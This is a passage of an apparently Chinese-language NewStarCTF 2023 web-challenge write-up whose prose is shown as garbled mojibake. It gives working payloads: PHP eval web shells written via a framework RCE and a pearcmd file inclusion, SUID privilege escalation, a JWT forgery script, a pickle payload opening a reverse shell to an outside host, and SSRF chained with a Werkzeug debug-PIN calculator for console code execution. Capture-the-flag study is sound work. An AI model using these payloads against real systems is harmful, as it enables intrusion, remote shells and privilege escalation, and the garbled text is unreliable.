_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo '&lt;?php eval($_POST['cmd']);?&gt;' &gt; /var/www/public/1.php</code></pre>
<p>è¿™é‡Œç”¨çš„æ˜¯å®˜æ–¹wpçš„payloadï¼Œä¸çŸ¥ä¸ºä½•è¿™é‡Œåå¼¹shellä¼¼ä¹ä¸æˆåŠŸï¼Œäºæ˜¯é‡‡ç”¨äº†execå†™å…¥æ–‡ä»¶çš„æ–¹å¼æ¥æ‰§è¡Œã€‚</p>
<p>å¦‚ä¸Šè¿°æ‰§è¡ŒæˆåŠŸåï¼Œèšå‰‘è¿æ¥ï¼Œè¿›å…¥ç»ˆç«¯åæ˜¾ç¤ºæ— æƒé™è¯»å–</p>
<p>![image-20231111093346977](NewStarCTF 2023/image-20231111093346977.png)</p>
<p>è¿™é‡Œä¹Ÿæ˜¯çœ‹wpå‘ç°ç”¨suidææƒï¼ˆä¹‹å‰ä¹Ÿæ²¡äº†è§£è¿‡ã€‚ã€‚ã€‚ã€‚</p>
<p>é‚£æˆ‘ä»¬å…ˆæŸ¥çœ‹å…·æœ‰suidæƒé™çš„å‘½ä»¤ï¼Œè¿™é‡Œä¸çŸ¥ä¸ºä½•è¾“å…¥å‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œéšåæƒ³åˆ°å°†å‘½ä»¤ç»“æœå†™å…¥æ–‡ä»¶ä¸­æ¥è¯»å–</p>
<pre><code class="hljs sh">find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-<span class="hljs-built_in">print</span>&nbsp;2&gt;/dev/null &gt; 1.txt</code></pre>
<p>ä¹‹å<code>cat 1.txt</code>çœ‹åˆ°ç›¸å…³å‘½ä»¤</p>
<p>![image-20231111093527982](NewStarCTF 2023/image-20231111093527982.png)</p>
<p>é‚£æˆ‘ä»¬ç›´æ¥ç”¨cpè¦†ç›–å³å¯</p>
<pre><code class="hljs sh"><span class="hljs-built_in">cp</span> /flag_dd3f6380aa0d /etc/passwd</code></pre>
<p>![image-20231111092542066](NewStarCTF 2023/image-20231111092542066.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week5web-yes-pickle">WEEK5|WEB-Yeâ€™s Pickle</h2>
<p>![image-20231111122457883](NewStarCTF 2023/image-20231111122457883.png)</p>
<p>è¿›å…¥é¦–é¡µç»™æˆ‘ä»¬å±•ç¤ºäº†tokenï¼Œçœ‹ç€æœ‰ä¸€éƒ¨åˆ†åƒbase64ï¼Œé‚£æˆ‘ä»¬è§£å¯†ä¸€ä¸‹çœ‹çœ‹</p>
<p>![image-20231111122534595](NewStarCTF 2023/image-20231111122534595.png)</p>
<p>è§£å¯†å‘ç°å«æœ‰jwtï¼Œé‚£å°±æœ‰å¯èƒ½éœ€è¦è¿›è¡Œjwtä¼ªé€ ã€‚æ¥ä¸‹æ¥å®¡è®¡ä¸€ä¸‹é¢˜ç›®ç»™çš„é™„ä»¶</p>
<pre><code class="hljs py"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> jwcrypto.jwk <span class="hljs-keyword">as</span> jwk
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">from</span> python_jwt <span class="hljs-keyword">import</span> *
app = Flask(__name__)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_string</span>(<span class="hljs-params">length=<span class="hljs-number">16</span></span>):
    characters = string.ascii_letters + string.digits  <span class="hljs-comment"># åŒ…å«å­—æ¯å’Œæ•°å­—</span>
    random_string = <span class="hljs-string">''</span>.join(random.choice(characters) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))
    <span class="hljs-keyword">return</span> random_string
app.config[<span class="hljs-string">'SECRET_KEY'</span>] = generate_random_string(<span class="hljs-number">16</span>)
key = jwk.JWK.generate(kty=<span class="hljs-string">'RSA'</span>, size=<span class="hljs-number">2048</span>)
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    payload=request.args.get(<span class="hljs-string">"token"</span>)
    <span class="hljs-keyword">if</span> payload:
        token=verify_jwt(payload, key, [<span class="hljs-string">'PS256'</span>])
        session[<span class="hljs-string">"role"</span>]=token[<span class="hljs-number">1</span>][<span class="hljs-string">'role'</span>]
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
    <span class="hljs-keyword">else</span>:
        session[<span class="hljs-string">"role"</span>]=<span class="hljs-string">"guest"</span>
        user={<span class="hljs-string">"username"</span>:<span class="hljs-string">"boogipop"</span>,<span class="hljs-string">"role"</span>:<span class="hljs-string">"guest"</span>}
        jwt = generate_jwt(user, key, <span class="hljs-string">'PS256'</span>, timedelta(minutes=<span class="hljs-number">60</span>))
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>,token=jwt)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/pickle"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">unser</span>():
    <span class="hljs-keyword">if</span> session[<span class="hljs-string">"role"</span>]==<span class="hljs-string">"admin"</span>:
        pickle.loads(base64.b64decode(request.args.get(<span class="hljs-string">"pickle"</span>)))
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">"0.0.0.0"</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)</code></pre>
<p>ç¬¬ä¸€ä¸ªå‡½æ•°ä¸»è¦æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼Œç”¨äºFlaskåº”ç”¨ç¨‹åºå¯†é’¥çš„éšæœºå­—ç¬¦ä¸²ã€‚æ¥ç€ä½¿ç”¨ <code>jwcrypto.jwk</code> åº“ç”Ÿæˆäº†ä¸€ä¸ªRSAå¯†é’¥ (<code>key</code>)ã€‚</p>
<p>ç„¶å/è·¯ç”±å¯¹åº”çš„æ–¹æ³•ï¼Œé¦–å…ˆæ˜¯æ¥å—ä¸€ä¸ªtokençš„ä¼ å‚ï¼Œéšåå¦‚æœpayloadå­˜åœ¨ï¼Œå°±ä½¿ç”¨verify_jwtè¿›è¡Œjwtçš„éªŒè¯ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™å°†roleèµ‹å€¼ä¸ºadminã€‚æ¥ä¸‹æ¥çœ‹pickleè·¯ç”±ï¼Œå¯¹åº”çš„æ˜¯pickleååºåˆ—åŒ–ï¼Œè¿™é‡Œå¦‚æœroleå¯¹åº”çš„å€¼ä¸ºadminï¼Œåˆ™å¯¹ä¼ å…¥çš„pickleå‚æ•°è¿›è¡Œpickleååºåˆ—åŒ–å¤„ç†ã€‚</p>
<p>é‚£æ€è·¯æ¸…æ™°äº†ï¼Œæˆ‘ä»¬å°±æ˜¯è¦æƒ³åŠæ³•è¿›è¡Œjwtçš„ä¼ªé€ ï¼Œä½¿å¾—roleçš„å€¼ä¸ºadminï¼Œä»è€Œè¿›è¡Œpickleå‘åºåˆ—åŒ–è¿›è¡ŒRCEï¼ˆè¿™é‡Œç”±äºæˆ‘ä¹Ÿæ²¡å­¦è¿‡ï¼Œå°±ç›´æ¥çœ‹wpäº†ï¼‰</p>
<p>expå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps
<span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode

<span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">topic</span>):
    <span class="hljs-string">""" Use mix of JSON and compact format to insert forged claims including long expiration """</span>
    [header, payload, signature] = topic.split(<span class="hljs-string">'.'</span>)
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload[<span class="hljs-string">'role'</span>] = <span class="hljs-string">"admin"</span>
    <span class="hljs-comment">#parsed_payload['exp'] = 2000000000</span>
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="hljs-string">','</span>, <span class="hljs-string">':'</span>))))
    <span class="hljs-keyword">return</span> <span class="hljs-string">'{"  '</span> + header + <span class="hljs-string">'.'</span> + fake_payload + <span class="hljs-string">'.":"","protected":"'</span> + header + <span class="hljs-string">'", "payload":"'</span> + payload + <span class="hljs-string">'","signature":"'</span> + signature + <span class="hljs-string">'"}'</span>
token = topic(<span class="hljs-string">'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.35mISFjtHpWWuJ6BMQsUQCrZ5iLMGvUSIeu3S7uNsPp_b-VnH9VmFFrZFf41xRQOG0hXFE1nQUWU_gEjbVsC7vTB0U6Ia9joAYgmgLAom2-i7hFsaLzJItLGtgHhz-HmcKerJ5QCvQeqXdSsmhRESXdg3NHQ-lHS9-2go2BXOtJjSy-MwKrOZJ2KAAMWMCR_P-CRIaZ0s7dLX1oeAfS7V5gRh-_tJGejQ_U7-jyqOa1mgDIIgczZYIfY-1Su34GhT7kWUUNulFkqSDy6OjARtC1ZhGOHKVd50ITnsDnT_NSzXARmZuMKEe5_2_k2E_-l2Pm4aIAQeSpx7oY5ueUGxQ'</span>)
<span class="hljs-built_in">print</span>(token)

p=<span class="hljs-string">b"(cos\nsystem\nS'bash -c \"bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1\"'\no"</span>
payload=base64.b64encode(p)
<span class="hljs-built_in">print</span>(payload)</code></pre>
<p>å¯å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://exp10it.cn/2022/10/2022-%E7%A5%A5%E4%BA%91%E6%9D%AF-web-writeup/#funweb%E5%A4%8D%E7%8E%B0">https://exp10it.cn/2022/10/2022-ç¥¥äº‘æ¯-web-writeup/#funwebå¤ç°</a></p>
<p>éšæœºå¯¹ç”Ÿæˆçš„jwtåœ¨/è·¯ç”±ä¸‹èµ‹å€¼ç»™tokenä¼ å…¥ï¼ˆè®°å¾—è¿›è¡Œurlç¼–ç ï¼‰</p>
<pre><code class="hljs plaintext">{"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9","signature":"35mISFjtHpWWuJ6BMQsUQCrZ5iLMGvUSIeu3S7uNsPp_b-VnH9VmFFrZFf41xRQOG0hXFE1nQUWU_gEjbVsC7vTB0U6Ia9joAYgmgLAom2-i7hFsaLzJItLGtgHhz-HmcKerJ5QCvQeqXdSsmhRESXdg3NHQ-lHS9-2go2BXOtJjSy-MwKrOZJ2KAAMWMCR_P-CRIaZ0s7dLX1oeAfS7V5gRh-_tJGejQ_U7-jyqOa1mgDIIgczZYIfY-1Su34GhT7kWUUNulFkqSDy6OjARtC1ZhGOHKVd50ITnsDnT_NSzXARmZuMKEe5_2_k2E_-l2Pm4aIAQeSpx7oY5ueUGxQ"}</code></pre>
<p>å¦‚ä¸‹å›¾ï¼Œåè¾¹çš„cookieè¿›è¡Œjwtè§£å¯†ä¸€ä¸‹å³å¯çœ‹åˆ°æˆ‘ä»¬çš„roleæ˜¯admin</p>
<p>![image-20231111121522491](NewStarCTF 2023/image-20231111121522491.png)</p>
<p>éšæœºå°†å³ä¾§çš„sessionèµ‹å€¼ç»™æˆ‘ä»¬å½“å‰çš„cookieï¼Œè¿›è¡Œadminçš„ä¼ªé€ ï¼Œæ¥ç€åœ¨pickleè·¯ç”±ä¸‹ï¼Œå¯¹pickleå‚æ•°ä¼ å…¥æ¶æ„ä»£ç è¿›è¡ŒRCE</p>
<pre><code class="hljs plaintext">b'KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjMzLjI2LzU1NTUgMD4mMSInCm8='</code></pre>
<p>![image-20231111123516998](NewStarCTF 2023/image-20231111123516998.png)</p>
<p>![image-20231111123531742](NewStarCTF 2023/image-20231111123531742.png)</p>
<p>æˆåŠŸæ‹¿åˆ°flag</p>
<h2 id="week5web-pppython">WEEK5|WEB-pppython?</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'hint'</span>] == [<span class="hljs-string">"your?"</span>, <span class="hljs-string">"mine!"</span>, <span class="hljs-string">"hint!!"</span>]){
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-type: text/plain"</span>);
        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">"ls / -la"</span>);
        <span class="hljs-keyword">exit</span>();
    }
    
    <span class="hljs-keyword">try</span> {
        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>]);
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number">60</span>);
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'lolita'</span>]);
        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;
        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);   
    }<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Error</span> <span class="hljs-variable">$x</span>){
        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
        <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-variable">$x</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());
    }

<span class="hljs-meta">?&gt;</span> <span class="hljs-title function_ invoke__">curl_setopt</span>(): The CURLOPT_HTTPHEADER option must have an <span class="hljs-keyword">array</span> value</code></pre>
<p>é¦–å…ˆæˆ‘ä»¬å…ˆç»™hintèµ‹å€¼ä¸ºæ•°ç»„å½¢å¼ï¼Œæ¥å–å¾—ä¸€äº›æ ¹ç›®å½•çš„ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ç«Ÿç„¶ä¸ä¼šï¼Œé—®äº†GPTå‘ç°è¦æ„é€ å¦‚ä¸‹payload</p>
<pre><code class="hljs http">?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!!</code></pre>
<p>![image-20231111144323387](NewStarCTF 2023/image-20231111144323387.png)</p>
<p><a target="_blank" rel="noopener" href="http://xn--flagapp-gx3k502aopmina36uwsgml7i.py">å¦‚å›¾çœ‹åˆ°å­˜åœ¨flagä¸app.py</a>ï¼Œé‚£æˆ‘ä»¬åº”è¯¥å°è¯•å»è¯»å–ï¼Œæ¥ä¸‹æ¥åœ¨çœ‹ä¸€ä¸‹ä»£ç ï¼Œå‘ç°å¯ä»¥è¿›è¡Œssrfä¸fileé…åˆè¯»å–ä¸€ä¸‹æ–‡ä»¶å†…å®¹</p>
<pre><code class="hljs http">?url=file:///app.py&amp;lolita[]="Content-type: text/plain</code></pre>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, render_template_string 
<span class="hljs-keyword">import</span> os, base64 <span class="hljs-comment">#from NeepuF1Le </span>
<span class="hljs-keyword">import</span> neepu_files 
app = Flask(__name__) 
app.config[<span class="hljs-string">'SECRET_KEY'</span>] = <span class="hljs-string">'******'</span> 
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>) </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>(): 
    <span class="hljs-keyword">if</span> session[<span class="hljs-string">"islogin"</span>] == <span class="hljs-literal">True</span>: 
        <span class="hljs-keyword">return</span> <span class="hljs-string">"flag{***********************}"</span> 
    app.run(<span class="hljs-string">'0.0.0.0'</span>, <span class="hljs-number">1314</span>, debug=<span class="hljs-literal">True</span>)<span class="hljs-number">1</span></code></pre>
<p>å‘ç°è¿™ä¾æ—§å¼€å¯äº†debugæ¨¡å¼ï¼Œä¼¼ä¹æš—ç¤ºç€æˆ‘è¦è®¡ç®—PINç ï¼Ÿ</p>
<p>ä¸è¿‡è¿™é‡Œéœ€è¦çŸ¥é“keyæ˜¯ä»€ä¹ˆï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“å¦‚ä½•æ‰¾ï¼Œåªèƒ½ç»§ç»­çœ‹wpäº†ï¼Œè¿™é‡Œwpè¯´ï¼š</p>
<p>ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ç®—cookieï¼Œæ³¨æ„machine_idä¸­ï¼Œ/proc/self/cgroupå­—æ®µçš„ç”Ÿæˆè¿‡ç¨‹ï¼Œä»¥åŠcookieçš„ç”Ÿæˆæ–¹å¼</p>
<p>![image-20231111155146958](NewStarCTF 2023/image-20231111155146958.png)</p>
<p>è¿™é‡Œä¹Ÿçœ‹ä¸æ‡‚ä¸Šé¢å›¾ç‰‡çš„å†…å®¹ã€‚ã€‚ã€‚ã€‚ä»–ç›´æ¥ç»™äº†è„šæœ¬</p>
<pre><code class="hljs py"><span class="hljs-comment"># sha1</span>
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain

probably_public_bits = [
    <span class="hljs-string">'root'</span>  <span class="hljs-comment"># /etc/passwd, /etc/shadowéªŒè¯</span>
    <span class="hljs-string">'flask.app'</span>,  <span class="hljs-comment"># é»˜è®¤å€¼ 'Flask',# é»˜è®¤å€¼</span>
    <span class="hljs-string">'Flask'</span>
    <span class="hljs-string">'/usr/local/lib/python3.10/dist-packages/flask/app.py'</span>  <span class="hljs-comment"># æŠ¥é”™å¾—åˆ°</span>
]
bid = <span class="hljs-string">"8cab9c97-85be-4fb4-9d17-29335d7b2b8a"</span>
did = <span class="hljs-string">"12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod0604f7b8_b39d_4c8d_8daf_6fb4636bb08a.slice/docker-f7abee7266a5d18c009c35c7978cbfb3d46348fa36d942f0ee430159bc92b75f.scope"</span>
did = did.strip().rpartition(<span class="hljs-string">"/"</span>)[<span class="hljs-number">2</span>]
<span class="hljs-built_in">print</span>(did)
private_bits = [
    <span class="hljs-string">'20724999646420262722'</span>,  <span class="hljs-comment"># /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span>
    <span class="hljs-comment"># machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1. /etc/machine-id  2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>
    bid + did  <span class="hljs-comment"># /proc/sys/kernel/random/boot_id</span>
]

h = hashlib.sha1()
<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:
        <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):
        bit = bit.encode(<span class="hljs-string">'utf-8'</span>)
    h.update(bit)
h.update(<span class="hljs-string">b'cookiesalt'</span>)

cookie_name = <span class="hljs-string">'__wzd'</span> + h.hexdigest()[:<span class="hljs-number">20</span>]

num = <span class="hljs-literal">None</span>
<span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
    h.update(<span class="hljs-string">b'pinsalt'</span>)
    num = (<span class="hljs-string">'%09d'</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]

rv = <span class="hljs-literal">None</span>
<span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:
            rv = <span class="hljs-string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">'0'</span>)
                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        rv = num


<span class="hljs-keyword">def</span> <span class="hljs-title function_">hash_pin</span>(<span class="hljs-params">pin: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">return</span> hashlib.sha1(<span class="hljs-string">f"<span class="hljs-subst">{pin}</span> added salt"</span>.encode(<span class="hljs-string">"utf-8"</span>, <span class="hljs-string">"replace"</span>)).hexdigest()[:<span class="hljs-number">12</span>]

<span class="hljs-built_in">print</span>(rv)
<span class="hljs-built_in">print</span>(cookie_name + <span class="hljs-string">"="</span> + <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">int</span>(time.time())}</span>|<span class="hljs-subst">{hash_pin(rv)}</span>"</span>)

<span class="hljs-comment"># 8Gb9QOttxQ8IUbpZ3dxJ</span>
<span class="hljs-comment"># http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__("os").popen("cat /flag").read()&amp;frm=0&amp;s=8Gb9QOttxQ8IUbpZ3dxJ</span></code></pre>
<p><code>8Gb9QOttxQ8IUbpZ3dxJ</code>çš„ç”±æ¥æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå¦‚ä¸‹payloadï¼š</p>
<pre><code class="hljs plaintext">?url=http://localhost:1314/console&amp;lolita[]=</code></pre>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå…¶ä¸­çš„keyå°±æ˜¯ä¸Šè¿°å­—ç¬¦ä¸²</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<pre><code class="hljs http">?url=http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__("os").popen("cat /flag").read()&amp;frm=0&amp;s=8Gb9QOttxQ8IUbpZ3dxJ&amp;lolita[]=Cookie: __wzdcdf8d549bf3448b85cde=1699692440|f54e820d6355</code></pre>
<p>è¿™é‡Œçœ‹ç€wpå†™çš„payloadå°±æ˜¯ä¸Šé¢çš„ï¼Œä½†ä¸çŸ¥ä¸ºä½•æˆ‘è¿™é‡Œæ‰§è¡Œåˆ°å¦‚ä¸‹é¡µé¢ä¹‹åï¼Œè¾“å…¥PINç æ²¡ååº”ã€‚ã€‚ã€‚</p>
<p>![image-20231111160337335](NewStarCTF 2023/image-20231111160337335.png)</p>
<p>æ„Ÿè§‰è¿˜æ˜¯ä¸å¤ªæ‡‚åŸç†çš„é—®é¢˜ï¼Œå…ˆåšå…¶ä»–äº†ï¼Œåé¢å­¦äº†å†çœ‹çœ‹</p>
<h2 id="week5web-4-å¤ç›˜">WEEK5|WEB-4-å¤ç›˜</h2>
<p>è¿™é‡Œçœ‹é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œä»¥ä¸ºåˆæ˜¯ä¸€ä¸ªå¤§å‹çš„å®¡è®¡ä»£ç é¢˜ç›®ï¼Œä¸è¿‡åœ¨index.phpå¤„å°±å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">'inc/header.php'</span>; <span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span> <span class="hljs-string">'inc/sidebar.php'</span>; <span class="hljs-meta">?&gt;</span>

  &lt;!-- Content Wrapper. Contains page content --&gt;

  <span class="hljs-meta">&lt;?php</span> 
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>])) {
          <span class="hljs-variable">$page</span> =<span class="hljs-string">'pages/'</span> .<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>].<span class="hljs-string">'.php'</span>;

        }<span class="hljs-keyword">else</span>{
          <span class="hljs-variable">$page</span> = <span class="hljs-string">'pages/dashboard.php'</span>;
        }
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$page</span>)) {
          <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$page</span>; 
        }<span class="hljs-keyword">else</span>{
          <span class="hljs-keyword">require_once</span> <span class="hljs-string">'pages/error_page.php'</span>;
        }
 <span class="hljs-meta">?&gt;</span>
  &lt;!-- Control Sidebar --&gt;
  &lt;aside <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">control</span>-<span class="hljs-title">sidebar</span> <span class="hljs-title">control</span>-<span class="hljs-title">sidebar</span>-<span class="hljs-title">dark</span>"&gt;</span>
<span class="hljs-class">    &lt;!-- <span class="hljs-title">Control</span> <span class="hljs-title">sidebar</span> <span class="hljs-title">content</span> <span class="hljs-title">goes</span> <span class="hljs-title">here</span> --&gt;</span>
<span class="hljs-class">  &lt;/<span class="hljs-title">aside</span>&gt;</span>
<span class="hljs-class">  &lt;!-- /.<span class="hljs-title">control</span>-<span class="hljs-title">sidebar</span> --&gt;</span>
<span class="hljs-class"></span>
<span class="hljs-class"> &lt;?<span class="hljs-title">php</span> <span class="hljs-title">require_once</span> '<span class="hljs-title">inc</span>/<span class="hljs-title">footer</span>.<span class="hljs-title">php</span>'; ?&gt;</span></code></pre>
<p>è™½ç„¶è¿™é‡Œå­˜åœ¨ï¼Œä½†æˆ‘æƒŠè®¶äºé‚£äº›ä½¬ç›´æ¥å°±åˆ¤æ–­å‡ºæ¥è¿™é“é¢˜æ˜¯pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«çš„åˆ©ç”¨ã€‚ã€‚ã€‚ã€‚</p>
<p>æˆ‘ä»¬ç›´æ¥ä¸Špayloadï¼š</p>
<pre><code class="hljs http">?+config-create+/&amp;page=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+shell.php</code></pre>
<p>bpæŠ“åŒ…å‘é€</p>
<p>![image-20231111171355020](NewStarCTF 2023/image-20231111171355020.png)</p>
<p>èšå‰‘è¿æ¥åï¼Œå‘ç°è¯»å–flagä¾æ—§æ²¡æƒé™ï¼Œå¾—ææƒ</p>
<p>![image-20231111171559067](NewStarCTF 2023/image-20231111171559067.png)</p>
<p>çœ‹çœ‹suidææƒå¦‚ä½•ï¼š</p>
<pre><code class="hljs plaintext">find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null
find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null &gt; 1.txt</code></pre>
<p>è¿™é‡Œä¸çŸ¥é“ä¸ºä½•ï¼Œå†™å…¥æ–‡ä»¶ä¹Ÿä¸è¡Œäº†ï¼Œåªå¥½ç›´æ¥çœ‹wpçš„ç­”æ¡ˆ</p>
<p>![image-20231111172304259](NewStarCTF 2023/image-20231111172304259.png)</p>
<p>è¿™é‡Œç”¨çš„æ˜¯gzipå‘½ä»¤è¯»å–æ–‡ä»¶</p>
<pre><code class="hljs plaintext">gzip&nbsp;-f&nbsp;/flag&nbsp;-t</code></pre>
<p>ä¸è¿‡æœ‰ä¸ªå‘ï¼Œæˆ‘ç›´æ¥å¤åˆ¶ä¸Šå»ï¼Œä¸€ç›´æ˜¾ç¤ºæˆ‘æ‰¾ä¸åˆ°å‘½ä»¤ä»€ä¹ˆçš„ï¼Œæ‰‹åŠ¨è¾“å…¥æ‰èƒ½æˆåŠŸè¯»å–flag</p>
<p>![image-20231111172352530](NewStarCTF 2023/image-20231111172352530.png)</p>
